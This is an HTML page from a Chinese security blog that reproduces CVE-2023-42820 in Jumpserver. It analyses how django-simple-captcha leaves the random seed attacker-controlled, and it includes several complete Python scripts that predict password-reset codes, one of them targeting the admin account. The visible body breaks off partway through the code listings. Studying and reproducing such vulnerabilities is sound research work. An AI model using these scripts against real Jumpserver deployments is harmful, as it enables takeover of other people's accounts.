<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Jumpserver随机数预测漏洞(CVE-2023-42820)复现 | zoiltin&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="一年之后才提上日程的CVE-2023-42820复现">
<meta name="author" content="">
<link rel="canonical" href="https://zoiltin.github.io/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:url" content="https://zoiltin.github.io/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/">
  <meta property="og:site_name" content="zoiltin&#39;s Blog">
  <meta property="og:title" content="Jumpserver随机数预测漏洞(CVE-2023-42820)复现">
  <meta property="og:description" content="一年之后才提上日程的CVE-2023-42820复现">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-11-20T19:12:11+00:00">
    <meta property="article:modified_time" content="2024-11-20T19:12:11+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Jumpserver随机数预测漏洞(CVE-2023-42820)复现">
<meta name="twitter:description" content="一年之后才提上日程的CVE-2023-42820复现">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://zoiltin.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Jumpserver随机数预测漏洞(CVE-2023-42820)复现",
      "item": "https://zoiltin.github.io/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Jumpserver随机数预测漏洞(CVE-2023-42820)复现",
  "name": "Jumpserver随机数预测漏洞(CVE-2023-42820)复现",
  "description": "一年之后才提上日程的CVE-2023-42820复现",
  "keywords": [
    
  ],
  "articleBody": "环境 Jumpserver \u003c= v3.6.4中存在CVE-2023-42820漏洞，可以预测随机数导致验证码预测。\n环境搭建\nvulnhub或者官网\n漏洞分析 github diff如下https://github.com/jumpserver/jumpserver/commit/ce645b1710c5821119f313e1b3d801470565aac0\nrandom_string函数用于生成密码重置的验证码，去掉了random的seed，所以代码中应该有地方可以设置可控seed。\njumpserver v3.6.4使用了django-simple-captcha v0.5.18来生成验证码，而此版本中在captcha_image函数中设置了种子，但结束后未将其置空。\n图片验证码逻辑 captcha相关路由如下：\nurlpatterns = [ re_path( r\"image/(?P\\w+)/$\", views.captcha_image, name=\"captcha-image\", kwargs={\"scale\": 1}, ), re_path( r\"image/(?P\\w+)@2/$\", views.captcha_image, name=\"captcha-image-2x\", kwargs={\"scale\": 2}, ), re_path(r\"audio/(?P\\w+).wav$\", views.captcha_audio, name=\"captcha-audio\"), re_path(r\"refresh/$\", views.captcha_refresh, name=\"captcha-refresh\"), ] 验证码刷新代码：\ndef captcha_refresh(request): \"\"\"Return json with new captcha for ajax refresh request\"\"\" if not request.headers.get(\"x-requested-with\") == \"XMLHttpRequest\": raise Http404 new_key = CaptchaStore.pick() ...... @classmethod def generate_key(cls, generator=None): challenge, response = captcha_settings.get_challenge(generator)() store = cls.objects.create(challenge=challenge, response=response) return store.hashkey @classmethod def pick(cls): if not captcha_settings.CAPTCHA_GET_FROM_POOL: return cls.generate_key() def fallback(): logger.error(\"Couldn't get a captcha from pool, generating\") return cls.generate_key() # Pick up a random item from pool minimum_expiration = timezone.now() + datetime.timedelta( minutes=int(captcha_settings.CAPTCHA_GET_FROM_POOL_TIMEOUT) ) store = ( cls.objects.filter(expiration__gt=minimum_expiration).order_by(\"?\").first() ) return (store and store.hashkey) or fallback() CAPTCHA_GET_FROM_POOL默认为False，pick通过get_chanllenge查找生成chal的函数并调用\njumpserver默认有如下设置:\nCAPTCHA_IMAGE_SIZE = (180, 38) CAPTCHA_FOREGROUND_COLOR = '#001100' CAPTCHA_NOISE_FUNCTIONS = ('captcha.helpers.noise_dots',) CAPTCHA_CHALLENGE_FUNCT = 'captcha.helpers.math_challenge' math_challenge用于生成简单的数学计算题。\ndef math_challenge(): operators = (\"+\", \"*\", \"-\") operands = (random.randint(1, 10), random.randint(1, 10)) operator = random.choice(operators) if operands[0] \u003c operands[1] and \"-\" == operator: operands = (operands[1], operands[0]) challenge = \"%d%s%d\" % (operands[0], operator, operands[1]) return ( \"{}=\".format(challenge.replace(\"*\", settings.CAPTCHA_MATH_CHALLENGE_OPERATOR)), str(eval(challenge)), ) 验证码刷新流程为：\n通过math_challenge生成简单算术题 将题目和答案保存 通过store.hashkey生成题目hash，将hash作为key返回 后续可根据此key获取图片。由captcha_image函数生成图片。\ncaptcha_image代码如下：\ndef captcha_image(request, key, scale=1): if scale == 2 and not settings.CAPTCHA_2X_IMAGE: raise Http404 try: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don't index these expired urls. return HttpResponse(status=410) random.seed(key) # Do not generate different images for the same key text = store.challenge if isinstance(settings.CAPTCHA_FONT_PATH, str): fontpath = settings.CAPTCHA_FONT_PATH elif isinstance(settings.CAPTCHA_FONT_PATH, (list, tuple)): fontpath = random.choice(settings.CAPTCHA_FONT_PATH) else: raise ImproperlyConfigured( \"settings.CAPTCHA_FONT_PATH needs to be a path to a font or list of paths to fonts\" ) if fontpath.lower().strip().endswith(\"ttf\"): font = ImageFont.truetype(fontpath, settings.CAPTCHA_FONT_SIZE * scale) else: font = ImageFont.load(fontpath) if settings.CAPTCHA_IMAGE_SIZE: size = settings.CAPTCHA_IMAGE_SIZE else: size = getsize(font, text) size = (size[0] * 2, int(size[1] * 1.4)) image = makeimg(size) xpos = 2 charlist = [] for char in text: if char in settings.CAPTCHA_PUNCTUATION and len(charlist) \u003e= 1: charlist[-1] += char else: charlist.append(char) for char in charlist: fgimage = Image.new(\"RGB\", size, settings.CAPTCHA_FOREGROUND_COLOR) charimage = Image.new(\"L\", getsize(font, \" %s \" % char), \"#000000\") chardraw = ImageDraw.Draw(charimage) chardraw.text((0, 0), \" %s \" % char, font=font, fill=\"#ffffff\") if settings.CAPTCHA_LETTER_ROTATION: charimage = charimage.rotate( random.randrange(*settings.CAPTCHA_LETTER_ROTATION), expand=0, resample=Image.BICUBIC, ) charimage = charimage.crop(charimage.getbbox()) maskimage = Image.new(\"L\", size) ...... for f in settings.noise_functions(): draw = f(draw, image) for f in settings.filter_functions(): image = f(image) ...... return response 先将key作为seed传入，后续需要计算random操作调用了多少次，姑且称其为偏移吧。\nsettings.CAPTCHA_FONT_PATH默认有值，不会调用random.choice\n之后会对text也就是算术题进行处理，会调用random.randrange(*settings.CAPTCHA_LETTER_ROTATION)，调用次数不确定。\n在noise_functions()中jumpserver设置为了captcha.helpers.noise_arcs和captcha.helpers.noise_dots，其中captcha.helpers.noise_dots会调用random。代码如下：\ndef noise_dots(draw, image): size = image.size for p in range(int(size[0] * size[1] * 0.1)): draw.point( (random.randint(0, size[0]), random.randint(0, size[1])), fill=settings.CAPTCHA_FOREGROUND_COLOR, ) return draw 图片大小决定seed的偏移。而jumpserver设置了默认图片大小，就是上面提到的CAPTCHA_IMAGE_SIZE = (180, 38)，在captcha_image函数中读取并赋值。\n密码重置验证码逻辑 UserResetPasswordSendCodeApi类定义了验证码逻辑：\ntoken = request.GET.get('token') userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse('authentication:forgot-previewing')) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get('username') form_type = serializer.validated_data['form_type'] code = random_string(6, lower=False, upper=False) ...... 漏洞利用 想要预测验证码达成以下条件：\n控制seed 可控seed的偏移 控制seed 通过路由/core/auth/captcha/image/{seed}/即可设置seed。需要注意：\n生成图片时会检查此key是否通过refresh生成：\ntry: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don't index these expired urls. return HttpResponse(status=410) 当一个验证码被使用后，对应的key会被删除，如果再次尝试设置seed为此key，会返回410错误，所以key不能复用。\n还有就是jumpserver会有多个进程进行监听，所以需要多次发包设置seed才能使所有进程的seed都被控制，提高成功率。\n计算random调用次数 noise_dots计算噪点以及最终生成code时调用次数都是固定的。不确定的地方是对challenge处理时调用次数会根据challenge内容决定。\n尝试枚举所有可能：\nlens = [] for i in range(1, 11): for l in range(1, 11): for p in ['*', '-', '+']: sum = 0 text = '{}{}{}='.format(str(i), p, str(l)) charlist = [] for char in text: if char in \"_\\\"',.;:-\" and len(charlist) \u003e= 1: charlist[-1] += char else: charlist.append(char) for char in charlist: sum = sum + 1 if sum not in lens: lens.append(sum) lens.sort() print(lens) # [3, 4, 5, 6] 计算4次的概率最大。\n半自动利用 利用流程：\n浏览器进入发送验证码页面 在发送验证码之前运行脚本预测验证码 发送验证码 原理：先设置seed，然后用gen_img_flow模拟seed偏移。因为次数为4的概率最大，所以固定为4。此脚本有概率失败大概为30%\n脚本如下：\nimport requests import random import string import re url = '' string_punctuation = '!#$%\u0026()*+,-.:;\u003c=\u003e?@[]^_~' key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = ['lower', 'upper', 'digit', 'special_char'] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`' assert length \u003e= args_true_count, f'Expected length \u003e= {args_true_count}, bug got {length}' can_startswith_special_char = args_true_count == 1 and special_char chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026 set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map['special_char']: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = ''.join(password) return password def set_seed(s : requests.Session): print('[*] start set seed') global key if key == None: res = s.get(url=url + '/core/auth/password/forget/previewing/') try: pattern = r'\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/' key = re.findall(pattern, res.text)[0] except: print('[-] get key failed') print(res.text) exit() if len(key) != 40 : print('[-] key error') exit() try: for i in range(10): res = s.get(url=url + '/core/auth/captcha/image/{}/'.format(key)) except: pass if __name__ == '__main__': s = requests.Session() key = None set_seed(s) random.seed(key) gen_img_flow(4) code = random_string(6, lower=False, upper=False) print(code) 提升成功概率的尝试 上面的脚本有概率失败是因为，seed偏移不确定。要提升成功率要从此入手。\n如下图： 需要获取原本seed的值或者chal\n思路一 设置两次seed(不可行) 可以先设置seed1，再设置seed2，这样chal由seed1生成，code由seed2生成。\n看似很合理，但其实不可行，因为如果要通过seed1计算chal，需要知道seed1的偏移，这就又变成要获取在seed1之前的那个未知chal了。\n如图所示： 思路二 chal辅助计算(可行) 在设置seed之后，查看生成的chal，手动输入chal辅助计算。\n如图： 虽说100%准确，但很麻烦，不用chal辅助正确率也能有60%以上了，意义不大。\nimport requests import random import string import re import PIL url = '' string_punctuation = '!#$%\u0026()*+,-.:;\u003c=\u003e?@[]^_~' key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = ['lower', 'upper', 'digit', 'special_char'] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`' assert length \u003e= args_true_count, f'Expected length \u003e= {args_true_count}, bug got {length}' can_startswith_special_char = args_true_count == 1 and special_char chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026 set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map['special_char']: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = ''.join(password) return password def set_seed(s : requests.Session): print('[*] start set seed') global key if key == None: res = s.get(url=url + '/core/auth/password/forget/previewing/') try: pattern = r'\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/' key = re.findall(pattern, res.text)[0] except: print('[-] get key failed') print(res.text) exit() if len(key) != 40 : print('[-] key error') exit() try: for i in range(10): res = s.get(url=url + '/core/auth/captcha/image/{}/'.format(key)) if i == 0: f = open('./out/out.png'.format(str(i)), 'wb') f.write(res.content) f.close() except: pass if __name__ == '__main__': s = requests.Session() key = None set_seed(s) img = PIL.Image.open('./out/out.png') img.show() chal = input(\"chal : \").replace('\\n', '') random.seed(key) CAPTCHA_LETTER_ROTATION = (-35, 35) charlist = [] for char in chal: if char == \"-\" and len(charlist) \u003e= 1: charlist[-1] += char else: charlist.append(char) for char in range(4): random.randrange(*CAPTCHA_LETTER_ROTATION) gen_img_flow(0) code = random_string(6, lower=False, upper=False) print(code) 思路三 自动校准偏移(不可行) 流程如下：\n先设置seed1 访问/core/auth/password/forget/previewing/路由刷新验证码，此时seed变为seed2，chal由seed1生成。 枚举由seed1生成的chal的四种可能，选择可能性最高尝试提交form。使用while 循环重复1-3步骤。如果验证码检验通过则break。 循环break说明seed2和chal均确定，此时可以准确计算code了。 验证码通过就代表偏移设置为4的情况生成的chal是正确的。\n流程图： 此时可以看到一个问题，如果要校准seed2的偏移必须要提交form通过验证码检验，但上文中的代码审计得知，一个seed对应的chal使用过一次就不能再用了，所以重新设置seed2会失败，返回410错误：\ntry: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don't index these expired urls. return HttpResponse(status=410) 所以这个方法不可行。不过还是把脚本贴上来吧：\nimport requests import random import string import re url = '' string_punctuation = '!#$%\u0026()*+,-.:;\u003c=\u003e?@[]^_~' key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def math_challenge(): operators = (\"+\", \"*\", \"-\") operands = (random.randint(1, 10), random.randint(1, 10)) operator = random.choice(operators) if operands[0] \u003c operands[1] and \"-\" == operator: operands = (operands[1], operands[0]) challenge = \"%d%s%d\" % (operands[0], operator, operands[1]) return ( \"{}=\".format(challenge.replace(\"*\", \"*\")), str(eval(challenge)), ) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = ['lower', 'upper', 'digit', 'special_char'] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`' assert length \u003e= args_true_count, f'Expected length \u003e= {args_true_count}, bug got {length}' can_startswith_special_char = args_true_count == 1 and special_char chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026 set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map['special_char']: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = ''.join(password) return password def set_seed(s : requests.Session): print('[*] start set seed') global key if key == None: res = s.get(url=url + '/core/auth/password/forget/previewing/') try: pattern = r'\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/' key = re.findall(pattern, res.text)[0] except: print('[-] get key failed') print(res.text) exit() if len(key) != 40 : print('[-] key error') exit() try: for i in range(10): res = s.get(url=url + '/core/auth/captcha/image/{}/'.format(key)) except: pass def get_reset_page_1(s : requests.Session) -\u003e tuple[str, str]: print(\"[*] start to get captcha0\") res = s.get(url=url + '/core/auth/password/forget/previewing/') key_pattern = r'\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/' csrf_token_pattern = r'name=\"csrfmiddlewaretoken\" value=\"(.*)\"' try: key = re.findall(key_pattern, res.text)[0] csrf_token = re.findall(csrf_token_pattern, res.text)[0] if len(key) == 40 and len(csrf_token) \u003e 0: print(\"[+] get captcha0 success\") return (key, csrf_token) except Exception as e: print(e) print(\"[-] get captcha0 failed\") exit() def send_captcha(s : requests.Session, captcha_0 : str, captcha_1 : str, csrf_token : str) -\u003e str: data = { \"csrfmiddlewaretoken\" : csrf_token, \"username\" : \"admin\", \"captcha_0\" : captcha_0, \"captcha_1\" : captcha_1 } res = s.post(url=url + '/core/auth/password/forget/previewing/', data=data, allow_redirects=False) if res.status_code == 302: token = res.headers.get(\"Location\").split(\"token=\")[-1] if len(token) \u003e 0: return token return None if __name__ == '__main__': while True: key = None s = requests.session() set_seed(s) # set seed + gen_img_flow captcha0_key, captcha0_csrf_token = get_reset_page_1(s) random.seed(key) gen_img_flow(4) chal, answer = math_challenge() token = send_captcha(s, captcha0_key, str(answer), captcha0_csrf_token) if token != None: break else: print(\"captcha incorrect\") key = captcha0_key set_seed(s) random.seed(key) CAPTCHA_LETTER_ROTATION = (-35, 35) charlist = [] for char in chal: if char == \"-\" and len(charlist) \u003e= 1: charlist[-1] += char else: charlist.append(char) for char in range(4): random.randrange(*CAPTCHA_LETTER_ROTATION) gen_img_flow(0) code = random_string(6, lower=False, upper=False) print(code) ",
  "wordCount" : "1626",
  "inLanguage": "en",
  "datePublished": "2024-11-20T19:12:11Z",
  "dateModified": "2024-11-20T19:12:11Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://zoiltin.github.io/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "zoiltin's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://zoiltin.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://zoiltin.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://zoiltin.github.io/posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://zoiltin.github.io/about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Jumpserver随机数预测漏洞(CVE-2023-42820)复现
    </h1>
    <div class="post-description">
      一年之后才提上日程的CVE-2023-42820复现
    </div>
    <div class="post-meta"><span title='2024-11-20 19:12:11 +0000 UTC'>November 20, 2024</span>&nbsp;·&nbsp;8 min

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#%e7%8e%af%e5%a2%83" aria-label="环境">环境</a></li>
                <li>
                    <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="漏洞分析">漏洞分析</a><ul>
                        
                <li>
                    <a href="#%e5%9b%be%e7%89%87%e9%aa%8c%e8%af%81%e7%a0%81%e9%80%bb%e8%be%91" aria-label="图片验证码逻辑">图片验证码逻辑</a></li>
                <li>
                    <a href="#%e5%af%86%e7%a0%81%e9%87%8d%e7%bd%ae%e9%aa%8c%e8%af%81%e7%a0%81%e9%80%bb%e8%be%91" aria-label="密码重置验证码逻辑">密码重置验证码逻辑</a></li></ul>
                </li>
                <li>
                    <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" aria-label="漏洞利用">漏洞利用</a><ul>
                        
                <li>
                    <a href="#%e6%8e%a7%e5%88%b6seed" aria-label="控制seed">控制seed</a></li>
                <li>
                    <a href="#%e8%ae%a1%e7%ae%97random%e8%b0%83%e7%94%a8%e6%ac%a1%e6%95%b0" aria-label="计算random调用次数">计算random调用次数</a></li>
                <li>
                    <a href="#%e5%8d%8a%e8%87%aa%e5%8a%a8%e5%88%a9%e7%94%a8" aria-label="半自动利用">半自动利用</a></li>
                <li>
                    <a href="#%e6%8f%90%e5%8d%87%e6%88%90%e5%8a%9f%e6%a6%82%e7%8e%87%e7%9a%84%e5%b0%9d%e8%af%95" aria-label="提升成功概率的尝试">提升成功概率的尝试</a><ul>
                        
                <li>
                    <a href="#%e6%80%9d%e8%b7%af%e4%b8%80-%e8%ae%be%e7%bd%ae%e4%b8%a4%e6%ac%a1seed%e4%b8%8d%e5%8f%af%e8%a1%8c" aria-label="思路一 设置两次seed(不可行)">思路一 设置两次seed(不可行)</a></li>
                <li>
                    <a href="#%e6%80%9d%e8%b7%af%e4%ba%8c-chal%e8%be%85%e5%8a%a9%e8%ae%a1%e7%ae%97%e5%8f%af%e8%a1%8c" aria-label="思路二 chal辅助计算(可行)">思路二 chal辅助计算(可行)</a></li>
                <li>
                    <a href="#%e6%80%9d%e8%b7%af%e4%b8%89-%e8%87%aa%e5%8a%a8%e6%a0%a1%e5%87%86%e5%81%8f%e7%a7%bb%e4%b8%8d%e5%8f%af%e8%a1%8c" aria-label="思路三 自动校准偏移(不可行)">思路三 自动校准偏移(不可行)</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="环境">环境<a hidden class="anchor" aria-hidden="true" href="#环境">#</a></h1>
<p><code>Jumpserver &lt;= v3.6.4</code>中存在CVE-2023-42820漏洞，可以预测随机数导致验证码预测。</p>
<p><strong>环境搭建</strong></p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/jumpserver/CVE-2023-42820">vulnhub</a>或者<a href="https://docs.jumpserver.org/zh/master/install/setup_by_fast/">官网</a></p>
<h1 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h1>
<p>github diff如下https://github.com/jumpserver/jumpserver/commit/ce645b1710c5821119f313e1b3d801470565aac0</p>
<p><img alt="1" loading="lazy" src="/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/images/1.png"></p>
<p>random_string函数用于生成密码重置的验证码，去掉了random的seed，所以代码中应该有地方可以设置可控seed。</p>
<p><code>jumpserver v3.6.4</code>使用了<code>django-simple-captcha v0.5.18</code>来生成验证码，而此版本中在<code>captcha_image</code>函数中设置了种子，但结束后未将其置空。</p>
<h2 id="图片验证码逻辑">图片验证码逻辑<a hidden class="anchor" aria-hidden="true" href="#图片验证码逻辑">#</a></h2>
<p>captcha相关路由如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>urlpatterns <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    re_path(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;image/(?P&lt;key&gt;\w+)/$&#34;</span>,
</span></span><span style="display:flex;"><span>        views<span style="color:#f92672">.</span>captcha_image,
</span></span><span style="display:flex;"><span>        name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;captcha-image&#34;</span>,
</span></span><span style="display:flex;"><span>        kwargs<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;scale&#34;</span>: <span style="color:#ae81ff">1</span>},
</span></span><span style="display:flex;"><span>    ),
</span></span><span style="display:flex;"><span>    re_path(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;image/(?P&lt;key&gt;\w+)@2/$&#34;</span>,
</span></span><span style="display:flex;"><span>        views<span style="color:#f92672">.</span>captcha_image,
</span></span><span style="display:flex;"><span>        name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;captcha-image-2x&#34;</span>,
</span></span><span style="display:flex;"><span>        kwargs<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;scale&#34;</span>: <span style="color:#ae81ff">2</span>},
</span></span><span style="display:flex;"><span>    ),
</span></span><span style="display:flex;"><span>    re_path(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;audio/(?P&lt;key&gt;\w+).wav$&#34;</span>, views<span style="color:#f92672">.</span>captcha_audio, name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;captcha-audio&#34;</span>),
</span></span><span style="display:flex;"><span>    re_path(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;refresh/$&#34;</span>, views<span style="color:#f92672">.</span>captcha_refresh, name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;captcha-refresh&#34;</span>),
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p>验证码刷新代码：</p>
